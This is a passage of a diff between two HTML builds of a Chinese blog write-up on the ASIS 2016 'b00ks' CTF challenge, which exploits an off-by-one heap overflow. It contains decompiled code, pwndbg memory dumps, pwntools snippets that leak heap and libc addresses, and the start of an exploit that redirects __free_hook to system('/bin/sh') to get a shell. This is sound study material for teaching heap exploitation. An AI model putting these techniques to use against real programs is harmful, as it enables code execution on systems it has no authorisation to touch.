 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span><span class="c1">// book_name
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v3</span> <span class="o">=</span> <span class="o">++</span><span class="n">unk_202024</span><span class="p">;</span><span class="c1">//id
 </span></span></span></code></pre></div><p>可以得到一个结构体：</p>
-<div class="highlight" id="id-8"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">book</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">book</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">id</span><span class="p">;</span><span class="c1">//offset:0
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">char</span><span class="o">*</span> <span class="n">name_ptr</span><span class="p">;</span><span class="c1">//offset:8
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">char</span><span class="o">*</span> <span class="n">description_ptr</span><span class="p">;</span><span class="c1">//offset:16
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">size</span><span class="p">;</span><span class="c1">//offset:24
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></div><p>最多20本书。</p>
-<div class="highlight" id="id-9"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">sub_B24</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">sub_B24</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-4h]
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
@@ -272,8 +295,11 @@ yutao@pwnbaby:~/ctf-challenges/pwn/heap/off_by_one/Asis_2016_b00ks$ checksec b00
 <li>off_202018地址中存放的是<strong>图书作者名指针</strong>，这个指针指向的地址是unk_202040</li>
 <li>off_202010地址中存放的是<strong>图书的结构体指针</strong>，这个指针指向的地址为unk_202060</li>
 </ul>
-<h4 id="漏洞" class="heading-element">
-  <a href="#%e6%bc%8f%e6%b4%9e" class="heading-mark"></a>漏洞</h4><div class="highlight" id="id-11"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_9F5</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">)</span>
+<h4 id="漏洞" class="heading-element"><span>漏洞</span>
+  <a href="#%e6%bc%8f%e6%b4%9e" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_9F5</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-Ch]
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
@@ -298,9 +324,15 @@ yutao@pwnbaby:~/ctf-challenges/pwn/heap/off_by_one/Asis_2016_b00ks$ checksec b00
 <li>图书结构体指针存放在off_202010中</li>
 <li>sub_9F5()存在off-by-one漏洞，在首次创建作者名或者修改作者名时，如果填写了32个字节的数据，会导致<code>\x00</code>溢出到off_202018的低位。</li>
 </ul>
-<h4 id="动态调试" class="heading-element">
-  <a href="#%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95" class="heading-mark"></a>动态调试</h4><h5 id="1定位输入的作者名的地址" class="heading-element">
-  <a href="#1%e5%ae%9a%e4%bd%8d%e8%be%93%e5%85%a5%e7%9a%84%e4%bd%9c%e8%80%85%e5%90%8d%e7%9a%84%e5%9c%b0%e5%9d%80" class="heading-mark"></a>1.定位输入的作者名的地址</h5><p>输入32字节的任意数据后，Ctrl+C进入调试界面，定位刚才输入的字符串，有两种方式：</p>
+<h4 id="动态调试" class="heading-element"><span>动态调试</span>
+  <a href="#%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><h5 id="1定位输入的作者名的地址" class="heading-element"><span>1.定位输入的作者名的地址</span>
+  <a href="#1%e5%ae%9a%e4%bd%8d%e8%be%93%e5%85%a5%e7%9a%84%e4%bd%9c%e8%80%85%e5%90%8d%e7%9a%84%e5%9c%b0%e5%9d%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>输入32字节的任意数据后，Ctrl+C进入调试界面，定位刚才输入的字符串，有两种方式：</p>
 <p><strong>第一种方式：</strong></p>
 <p>作者名存放在off_202018中，因此知道代码段的基地址后，加上偏移就可找到存放作者名的指针。</p>
 <p>vmmap查看代码段的起始地址</p>
@@ -336,8 +368,11 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x555555756088:	0x0000000000000000	0x0000000000000000</code></pre><p><strong>第二种方式</strong></p>
 <p>使用pwngdb的search命令进行搜索：</p>
 <pre tabindex="0"><code>pwndbg&gt; search aaaaaaaaaaaaaaaaaaaaaaaaa
-b00ks           0x555555756040 &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;</code></pre><h5 id="2泄露图书结构体指针" class="heading-element">
-  <a href="#2%e6%b3%84%e9%9c%b2%e5%9b%be%e4%b9%a6%e7%bb%93%e6%9e%84%e4%bd%93%e6%8c%87%e9%92%88" class="heading-mark"></a>2.泄露图书结构体指针</h5><p>接下来泄露图书结构体指针，<strong>输入命令c回到程序执行的界面</strong>，创建图书：</p>
+b00ks           0x555555756040 &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;</code></pre><h5 id="2泄露图书结构体指针" class="heading-element"><span>2.泄露图书结构体指针</span>
+  <a href="#2%e6%b3%84%e9%9c%b2%e5%9b%be%e4%b9%a6%e7%bb%93%e6%9e%84%e4%bd%93%e6%8c%87%e9%92%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>接下来泄露图书结构体指针，<strong>输入命令c回到程序执行的界面</strong>，创建图书：</p>
 <ol>
 <li>创建book1：
 <ul>
@@ -382,11 +417,14 @@ Name: book2_name
 Description: book2_desc
 Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`wuUUU</code></pre><p>其中<code>0x0000555555757760</code>即对应`wuUUU。</p>
 <p>payload：</p>
-<div class="highlight" id="id-17"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">senline</span><span class="p">(</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">senline</span><span class="p">(</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Author: &#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">book1_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span></span></span></code></pre></div><h5 id="3覆盖原有的结构体指针" class="heading-element">
-  <a href="#3%e8%a6%86%e7%9b%96%e5%8e%9f%e6%9c%89%e7%9a%84%e7%bb%93%e6%9e%84%e4%bd%93%e6%8c%87%e9%92%88" class="heading-mark"></a>3.覆盖原有的结构体指针</h5><pre tabindex="0"><code>pwndbg&gt; x/32gx 0x0000555555757760
+</span></span><span class="line"><span class="cl"><span class="n">book1_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span></span></span></code></pre></div><h5 id="3覆盖原有的结构体指针" class="heading-element"><span>3.覆盖原有的结构体指针</span>
+  <a href="#3%e8%a6%86%e7%9b%96%e5%8e%9f%e6%9c%89%e7%9a%84%e7%bb%93%e6%9e%84%e4%bd%93%e6%8c%87%e9%92%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>pwndbg&gt; x/32gx 0x0000555555757760
 0x555555757760:	0x0000000000000001	0x0000555555757670#book1
 0x555555757770:	0x0000555555757690	0x00000000000000c8#book1
 0x555555757780:	0x0000000000000000	0x0000000000000031#book1
@@ -406,8 +444,11 @@ Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`wuUUU</code></pre><p>其中<code>0x0000
 0x555555756070:	0x0000000000000000	0x0000000000000000
 0x555555756080:	0x0000000000000000	0x0000000000000000</code></pre><p>此时程序就会去0x0000555555757700的位置寻找结构体，</p>
 <p><img loading="lazy" src="%e5%a0%86%e4%b8%ad%e7%9a%84off-by-one//1616265201903.png" alt="堆中的off-by-one//1616265201903.png" srcset="%e5%a0%86%e4%b8%ad%e7%9a%84off-by-one//1616265201903.png?size=small, %e5%a0%86%e4%b8%ad%e7%9a%84off-by-one//1616265201903.png?size=medium 1.5x, %e5%a0%86%e4%b8%ad%e7%9a%84off-by-one//1616265201903.png?size=large 2x" data-title="堆中的off-by-one//1616265201903.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h5 id="4伪造结构体并泄露book2_namebook2_desc" class="heading-element">
-  <a href="#4%e4%bc%aa%e9%80%a0%e7%bb%93%e6%9e%84%e4%bd%93%e5%b9%b6%e6%b3%84%e9%9c%b2book2_namebook2_desc" class="heading-mark"></a>4.伪造结构体并泄露book2_name,book2_desc</h5><p>下面解释为什么book2的书名大小和书名类别大小设置为135168：</p>
+<h5 id="4伪造结构体并泄露book2_namebook2_desc" class="heading-element"><span>4.伪造结构体并泄露book2_name,book2_desc</span>
+  <a href="#4%e4%bc%aa%e9%80%a0%e7%bb%93%e6%9e%84%e4%bd%93%e5%b9%b6%e6%b3%84%e9%9c%b2book2_namebook2_desc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>下面解释为什么book2的书名大小和书名类别大小设置为135168：</p>
 <pre tabindex="0"><code>pwndbg&gt; vmmap
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     0x555555554000     0x555555556000 r-xp     2000 0      /home/yutao/Desktop/b00ks
@@ -487,15 +528,18 @@ edit(1, payload)
 0x555555758380:	0x0000000000000000	0x0000000000000031 &lt;= #book1
 0x555555758390:	0x0000000000000002	0x00007ffff7fbe010 &lt;= #book2
 0x5555557583a0:	0x00007ffff7f9c010	0x0000000000021000 &lt;= #book2
-0x5555557583b0:	0x0000000000000000	0x000000000001fc51 &lt;= #book2</code></pre><h5 id="5计算libc基地址freehooksystembinsh地址" class="heading-element">
-  <a href="#5%e8%ae%a1%e7%ae%97libc%e5%9f%ba%e5%9c%b0%e5%9d%80freehooksystembinsh%e5%9c%b0%e5%9d%80" class="heading-mark"></a>5.计算libc基地址，freehook、system、/bin/sh地址</h5><p>得到了book2_name2的地址就可以计算libc的基地址了，<strong>上面book2_name的内容在mmap扩展的内存空间里。</strong></p>
+0x5555557583b0:	0x0000000000000000	0x000000000001fc51 &lt;= #book2</code></pre><h5 id="5计算libc基地址freehooksystembinsh地址" class="heading-element"><span>5.计算libc基地址，freehook、system、/bin/sh地址</span>
+  <a href="#5%e8%ae%a1%e7%ae%97libc%e5%9f%ba%e5%9c%b0%e5%9d%80freehooksystembinsh%e5%9c%b0%e5%9d%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>得到了book2_name2的地址就可以计算libc的基地址了，<strong>上面book2_name的内容在mmap扩展的内存空间里。</strong></p>
 <p>payload：</p>
-<div class="highlight" id="id-25"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Name: &#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">mmap_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span></span></span></code></pre></div><p>通过调试得到libc和mmap分配的堆块之间的偏移是固定的，接下来可以使用book2_name_addr或者book2_desc_addr任意一个计算偏移，下面使用book2_name_addr计算偏移：</p>
 <pre tabindex="0"><code>book2_name - libc_addr = 0x00007ffff7fbe010 -  0x7ffff79e2000 = 0x5dc010</code></pre><p>或者直接这样：</p>
 <pre tabindex="0"><code>libc_addr = 0x7ffff79e2000</code></pre><p>在之后：</p>
-<div class="highlight" id="id-28"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;__free_hook&#34;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_addr</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;__free_hook&#34;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_addr</span>
 </span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_addr</span>
 </span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span> <span class="o">+</span> <span class="n">libc_addr</span>
 </span></span><span class="line"><span class="cl">
@@ -508,7 +552,7 @@ edit(1, payload)
 </span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span></span></span></code></pre></div><p>payload2通过修改book1_desc来修改book2_desc指向的地址</p>
 <p>在这段代码中，首先是修改<code>book1_description</code>，而此时的book1是之前伪造的book2，也就是说这里的<code>book1_description_ptr</code>正好是指向<code>book2_struct</code>中的<code>book2_name_ptr</code>。通过这个修改，将<code>book2_name_ptr</code>改为了binsh字符串的地址，将<code>book2_description_ptr</code>改为了<code>free_hook</code>指针的地址。然后通过修改<code>book2_description_ptr</code>，将<code>free_hook</code>中的内容改为了<code>system()</code>的地址。之后在删除book2时，会首先调用free()释放<code>book2_name_ptr</code>指针指向的地址空间，原本的<code>free(book2_name_ptr)</code> 最终变为 <code>system(binsh_addr)</code>。</p>
 <p>**什么是__free_hook?**举个栗子：</p>
-<div class="highlight" id="id-29"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include&lt;stdio.h&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include&lt;stdio.h&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp">##include&lt;stdlib.h&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp">##include&lt;string.h&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
@@ -527,7 +571,7 @@ edit(1, payload)
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="c1">//运行./a.out 就直接运行了system(&#34;/bin/sh&#34;)
 </span></span></span></code></pre></div><p><strong>EXP：</strong></p>
-<div class="highlight" id="id-30"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">name_len</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">desc_len</span><span class="p">,</span> <span class="n">desc</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
@@ -607,9 +651,9 @@ edit(1, payload)
           </div></div><div class="post-info-line">
         <div class="post-info-md"></div>
         <div class="post-info-share">
-          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" data-title="堆中的off-by-one" data-hashtags="PWN"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
-  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" data-hashtag="PWN"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
-  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" data-title="堆中的off-by-one"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="http://ghostasky.github.io/posts/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" data-title="堆中的off-by-One" data-hashtags="PWN"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://ghostasky.github.io/posts/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" data-hashtag="PWN"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://ghostasky.github.io/posts/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" data-title="堆中的off-by-One"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
   </span>
         </div>
       </div></div>
@@ -628,14 +672,14 @@ edit(1, payload)
 
   <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
       <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
-    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.8-RC"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
         </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
             <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
-              <a href="/"></a></span></div></div>
+              <a href="/">Ghostasky</a></span></div></div>
   </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
         </div></div><div id="mask"></div><noscript>
-    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
   </noscript>
 </div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
